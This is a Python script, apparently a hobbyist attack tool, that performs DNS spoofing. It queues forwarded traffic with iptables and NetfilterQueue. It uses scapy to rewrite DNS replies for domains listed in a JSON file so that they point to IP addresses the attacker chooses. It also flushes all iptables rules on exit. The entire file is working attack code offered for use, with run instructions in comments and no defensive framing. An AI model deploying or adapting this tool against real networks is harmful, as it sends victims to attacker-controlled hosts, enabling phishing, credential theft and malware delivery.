import argparse
from scapy.all import *
from scapy.all import DNS, DNSQR, DNSRR, UDP , IP
from netfilterqueue import NetfilterQueue
import os
import json

dns_hosts = {}  # Global variable to store DNS hosts

def get_args():
    parser = argparse.ArgumentParser()                         # this function used to determine how to run the script
    parser.add_argument('-dh', '--dns-hosts', dest='hosts',    # python DNS_Spoofing.py -dh dns_hosts.json
                        help='Json which specifies the host to be spoofed and the corresponding IP.',
                        required=True)
    options = parser.parse_args()
    return options


def encode_dictionary_keys(dictionary):         # this function used to convert the char to bytes
    encoded_dict = {}
    for key in dictionary.keys():
        encoded_key = key.encode()
        encoded_dict[encoded_key] = dictionary[key]
    return encoded_dict


def process_packet(packet):                                # this function used to check if the packet has a dns request 
    # Convert netfilter queue packet to a Scapy packet     
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # If the packet is a DNS Resource Record (DNS Reply), modify the packet
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # If it's not UDP
            pass
        print("[After]:", scapy_packet.summary())
        # Convert back to netfilter packet
        packet.set_payload(bytes(scapy_packet))
    packet.accept()
   
    
def modify_packet(packet):                                          # this function convert the ip(that you want) of dns packets 
    qname = packet[DNSQR].qname  # DNS question name, domain name
    if qname not in dns_hosts:
        print("No modifications:", qname)
        return packet
    # Modify the answer (an)
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[DNS].ancount = 1  # Single DNSRR for the victim
    # Delete checksum and length fields of the packet
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet


if __name__ == "__main__":
    print("-----> DNS Spoofing are running now (Ahmad is the king)")
    args = get_args()
    # Load DNS hosts from a JSON file
    with open(args.hosts) as f:
        dns_hosts = json.load(f)
    dns_hosts = encode_dictionary_keys(dns_hosts)
    QUEUE_NUM = 0
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # Add packets to the queue
    queue = NetfilterQueue()
    try:
        # Bind the queue to the number and the function to invoke
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        print("[+] DNS Spoofing Stopped thank you for using our tool")
        os.system("iptables --flush")  # Restore the iptables rule